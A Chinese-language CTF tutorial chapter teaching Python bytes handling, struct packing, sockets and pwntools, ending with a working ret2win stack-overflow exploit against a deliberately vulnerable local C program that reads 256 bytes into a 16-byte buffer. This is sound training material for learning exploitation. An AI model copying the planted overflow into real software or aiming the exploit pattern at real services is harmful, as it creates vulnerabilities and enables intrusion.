---
chapter: 通用基础
section: Python 与 CTF 脚本基础
order: 106
tags:
  - CTF
  - 通用基础
  - Python
  - pwntools
publish: true
---

# 06 Python 与 CTF 脚本基础
## Python & CTF Scripting Basics

> [!info]- 章节信息
> **所属方向**：通用基础 ｜ **难度阶段**：L0 预备期 ｜ **前置要求**：[[01-Linux环境与CTF实验环境搭建|01 Linux 环境与 CTF 实验环境搭建]]
> **本章目标**：能把字节串、结构体打包、socket 读写玩熟；能用 pwntools 写出"连接 → 交互 → 发 payload → 收 flag"的完整 exploit 骨架，并在本地一道 ret2win 上跑通。
> **已核验说明**：本章代码全部在 WSL Ubuntu 26.04（Python 3.14 / pwntools 4.15.0）实跑通过，ret2win 例子的 flag 是真跑出来的。

## 1. 为什么是 Python

PWN 和逆向的最终产物是 exploit 脚本：连接靶机、按协议交互、把地址打包成字节发过去、收回 flag。这件事要快速处理二进制数据 + 开网络连接 + 即写即跑，Python 全占。01 装环境时那条 `python3 -m pip install pwntools`，装的就是干这个的框架。~~当然你也可以手写汇编然后编译成shellcode直接二进制发送，我只能说大神受小弟一拜~~

语法基础要有，但不需要背 —— 下面这张速查表覆盖日常九成用量，忘了回来翻。
## 2. 语法速查

```python
flag = "flag{" + "abc}"                    # 字符串拼接 → 'flag{abc}'
s = "abcdefgh"
s[1:4], s[-1], s[::-1]                     # 切片：'bcd' 'h' 'hgfedcba'（反转常用）

items = [1, 2, 3] + [4]                    # 列表拼接 → [1, 2, 3, 4]
d = {"a": 1, "b": 2}
d.get("c", 0)                              # 取不到给默认值，不抛异常
"a" in d                                   # True

squares = [x * x for x in range(5)]        # 推导式 → [0, 1, 4, 9, 16]
for i, v in enumerate(["a", "b"]): ...     # 带下标遍历
list(zip([1, 2], [3, 4]))                  # 配对 → [(1, 3), (2, 4)]
a, *rest = [1, 2, 3]                       # 解包：a=1, rest=[2, 3]

def f(x, n=2):                             # 默认参数
    return x ** n

try:
    int("xyz")
except ValueError as e:                    # 按异常类型接，别裸 except
    print(e)

f"{0x41:#x}"                               # f-string → '0x41'
f"{'flag{abc}':>10}"                       # 右对齐补到 10 位，对齐输出常用
```

要点就三个：==缩进是语法==（四个空格，别混 Tab）；==变量没有类型声明==，`int` 还是任意精度，不会溢出（溢出是 C 的事）；报错先读最后一行——`TypeError` 多半是 bytes 和 str 混了，[[#3. 字节串与打包|下一节]]就是讲这个。==🔴布拉布拉还有很多，都是Python基础，不会了问AI。==

## 3. 字节串与打包

CTF 脚本一半的工作量在"数 ↔ 字节"之间来回变。先立住分界线：==str 是字符，bytes 是字节；网络和文件里流动的永远是 bytes==。

```python
s = "flag{abc}"
b = s.encode()                       # str → bytes：b'flag{abc}'
s2 = b.decode()                      # bytes → str
b[0]                                 # 102 —— 下标取出的是 int，不是 'f'
b.hex()                              # '666c61677b6162637d'
bytes.fromhex('666c6167')            # b'flag'
```

整数和字节串互转，对应 [[03-计算机组成与数据表示|03 计算机组成与数据表示]] 的小端序：

```python
(0x41424344).to_bytes(4, 'little')   # b'DCBA'
int.from_bytes(b'DCBA', 'little')    # 0x41424344
```

一次要打包多个字段时，用 `struct`：

| 格式符 | C 类型 | 大小 |
| ------ | ------ | ---- |
| `B` | unsigned char | 1 |
| `H` | unsigned short | 2 |
| `I` | unsigned int | 4 |
| `Q` | unsigned long long | 8 |
| `x` | 跳过/填充 1 字节 | — |
| `s` | bytes 原样 | 定长 |

前缀 `<` 小端、`>` 大端。CTF 里 x86/x64 全用 `<`。实测：

```python
struct.pack('<I', 0x41424344)          # b'DCBA'
struct.unpack('<II', b'ABCDEFGH')      # (0x44434241, 0x48474645)
struct.unpack('<H', b'\x01\x02')       # (0x0201,)
struct.unpack('<Bxxxi', b'X\x00\x00\x00' + struct.pack('<i', 100))  # (88, 100)
```

最后一条是 05 章解析器里反复出现的套路：`xxx` 跳过对齐填充。==pwntools 的 `p32`/`p64`、`u32`/`u64` 就是 `struct.pack('<I/Q')` 的薄封装==。

## 4. 文件与网络 IO

文件读写一律 `with`，退出自动关闭：

```python
with open('data.bin', 'rb') as f:     # 注意 'rb'/'wb'：二进制模式没有编码转换
    header = f.read(64)
with open('out.bin', 'wb') as f:
    f.write(struct.pack('<IQ', 7, 0xdeadbeefcafe))
```

socket 客户端的最小骨架，每个 CTF 平台交互本质都是它：

```python
import socket
c = socket.socket()
c.connect(('1.2.3.4', 1337))          # (主机, 端口)
c.send(b'hello\n')                    # 参数必须是 bytes
data = c.recv(1024)                   # 最多读 1024 字节，读到多少算多少
c.close()
```

`recv(n)` 的返回值**可能小于 n**，TCP 不保证一次到齐 —— 真要定长就读循环。不过这活 pwntools 包了，`recvuntil` 按标记收，日常不再裸写 socket，知道底长什么样就行。

>[!info] 关于计算机网络
>你可能会问我TCP是什么？主机是什么？端口是什么？socket是什么？孩子，这是计算机网络的内容，我只能说看我心情写不写单独文章，没有就自己问AI吧，还有==依旧408考研重点==。

## 5. pwntools 骨架

### 5.1 常用 API

```python
from pwn import *
context.arch = 'amd64'                # 或 context.binary = ELF('./vuln')，顺带设全
context.log_level = 'info'            # debug/info/warn/error

io = process('./vuln')                # 起本地进程
io = remote('1.2.3.4', 1337)          # 连远程靶机，其余代码一行不用改

io.recvline()                         # 收一行（含 \n）
io.recvuntil(b'name:\n')              # 收到标记为止 —— 交互题的标配
io.send(b'AAAA')                      # 原样发
io.sendline(b'AAAA')                  # 追加 \n 发
io.sendafter(b'prompt', payload)      # 收到 prompt 再发
io.recvall(timeout=2)                 # 收到连接关闭，适合最后收 flag
io.interactive()                      # 交给人手动玩，调试利器
io.close()

p64(0x401234)                         # 8 字节小端打包，等价 struct.pack('<Q', ...)
u64(data.ljust(8, b'\x00'))           # 泄露地址还原的标准姿势
cyclic(200)                           # 'aaaabaaacaaa...' 模式串
cyclic_find(0x61616168)               # 反查偏移，04 章讲过原理
elf = ELF('./vuln')                   # 05 章手写解析器的自动化版
elf.symbols['win']                    # 函数地址
elf.got['printf']                     # GOT 表项地址
gdb.attach(io)                       # 拉起 GDB 附加（配 pwndbg）
```

### 5.2 完整流程：本地 ret2win 实测

目标程序（04 章栈帧知识的直接应用，`gcc -O0 -fno-stack-protector -no-pie vuln.c -o vuln`）：

```c
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{skeleton_ok}");
    _exit(0);
}

void vuln(void) {
    char buf[16];
    puts("name:");
    read(0, buf, 0x100);              // 16 字节的 buf，读 256 字节
}

int main(void) { setbuf(stdout, NULL); vuln(); return 0; }
```

`context.binary = ELF('./vuln')` 在启动时顺手把保护打出来，省了 checksec：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

exploit 全文，两步走 —— 先用 `cyclic` 找偏移，再覆盖返回地址：

```python
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'warn'

# 第一步：cyclic 找偏移
io = process('./vuln')
io.recvline()
io.send(cyclic(200))
io.wait()                                     # 等它崩溃
core = io.corefile                            # 读 coredump
offset = cyclic_find(core.fault_addr & 0xffffffff)

# 第二步：覆盖返回地址到 win
io = process('./vuln')
io.recvline()
io.send(b'A' * offset + p64(elf.symbols['win']))
print(io.recvall(timeout=2).decode())
```

实测输出：

```
[*] offset = 24
flag{skeleton_ok}
```

24 = buf 的 16 字节 + 保存的 rbp 的 8 字节，和 02 章那张栈帧布局图完全对得上。跑通这个流程，"连接 → 交互 → 发 payload → 收 flag"的骨架就齐了，之后的所有题目只是往这个骨架里换漏洞和 payload。需要看中间过程时把 `log_level` 调到 `debug`，每字节收发都有日志。

## 6. 常见问题

| 现象 | 原因与解决 |
| ---- | ---------- |
| `TypeError: can't concat str to bytes` | str 和 bytes 混用；payload 一律 bytes，文本用 `.encode()` |
| `recv` 一直卡住 | 在等一个没出现的标记，或对方根本没发；用 `recvuntil` 对准程序的提示串，配合 `context.log_level='debug'` 看收发 |
| 地址打过去没反应 | 忘了 `p64()` 打包，发过去的是 `str`；或打包了却没对齐小端（`p64` 默认就是对的，别手拼） |
| `u64` 报长度错 | 泄露出来的是 6 字节地址，补齐 8 位：`u64(data.ljust(8, b'\x00'))` |
| `process()` 在 Windows 报错 | pwntools 的本地进程不支持 Windows，进 WSL 跑；`remote()` 不受限 |
| pip 装 pwntools 编译失败 | 新版 Python 缺预编译轮子，直接 `sudo apt install python3-pwntools` |
| `cyclic_find` 报 "expected a 4-byte subsequence" | 传了 8 字节，截前 4 字节即可：`cyclic_find(x & 0xffffffff)` |
| flag 只收到一半 | 用 `recvall(timeout=2)` 收到连接关闭，别掐着时间 `recv` |
| 脚本重复连接触发靶机限制 | `io.close()` 用完关掉；`remote()` 换 `process()` 本地先调通再打远程 |
| 想发 0x0a 却把交互搞乱 | `\n` 会被按行解析的对方截断，该用 `send` + 精确长度时别用 `sendline` |
